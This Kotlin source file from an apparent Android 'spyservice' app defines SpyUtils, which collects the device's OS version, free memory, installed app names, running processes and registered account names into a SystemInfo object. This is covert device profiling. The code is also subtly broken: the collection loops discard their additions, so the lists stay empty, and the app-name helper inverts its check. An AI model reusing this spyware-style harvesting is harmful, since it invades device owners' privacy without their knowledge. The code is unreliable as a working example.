package com.example.spyservice.util

import android.accounts.AccountManager
import android.app.ActivityManager
import android.content.Context
import com.example.spyservice.models.SystemInfo
import android.content.pm.PackageManager
import android.content.pm.ApplicationInfo
import android.content.Context.ACTIVITY_SERVICE

object SpyUtils {
    fun getSystemInfo(context: Context): SystemInfo {
        val gotOsVersion = android.os.Build.VERSION.RELEASE
        val gotSdkVersion = android.os.Build.VERSION.SDK_INT

        val packageManager = context.packageManager
        val appList = packageManager.getInstalledApplications(PackageManager.GET_META_DATA).toList()
        val gotAppList = emptyList<String>()
        //var ai : ApplicationInfo
        for (app in appList){
            gotAppList.toMutableList().add(getApplicationName(app))
        }

        val activityManager = context.getSystemService(ACTIVITY_SERVICE) as ActivityManager
        val procInfos = activityManager.runningAppProcesses
        val gotProcList = emptyList<String>()
        for (runningProInfo in procInfos) {
            //Log.d("Running Processes", "()()" + runningProInfo.processName)
            gotProcList.toMutableList().add(runningProInfo.processName)
        }

        val accountManager = AccountManager.get(context)
        val account = accountManager.accounts.toList()
        val gotAccList = emptyList<String>()
        for (acc in account){
            gotAccList.toMutableList().add(acc.name)
        }

        return SystemInfo(
            osVersion = gotOsVersion,
            sdkVersion = gotSdkVersion,
            freeSpace = getAvailableMemory(context),
            appList = gotAppList,
            procList = gotProcList,
            accList = gotAccList
        )
    }

    private fun getAvailableMemory(context: Context): Long {
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        return ActivityManager.MemoryInfo().let { memoryInfo ->
            activityManager.getMemoryInfo(memoryInfo)
            (memoryInfo.availMem / (1024*1024)).toLong()
        }
    }

    private fun getApplicationName(applicationInfo: ApplicationInfo): String {
        //val applicationInfo = context.applicationInfo
        val stringId = applicationInfo.labelRes
        return if (stringId == 0) applicationInfo.nonLocalizedLabel.toString() else "unknown"
    }


    /*private fun getInstalledApps() {
        val list = packageManager.getInstalledPackages(0)
        for (i in list.indices) {
            val packageInfo = list[i]
            if (packageInfo!!.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM == 0) {
                val appName = packageInfo.applicationInfo.loadLabel(packageManager).toString()
                Log.e("App List$i", appName)
                arrayAdapter = ArrayAdapter(this,
                    R.layout.support_simple_spinner_dropdown_item, list as List)
                listView.adapter = arrayAdapter
            }
        }*/
}
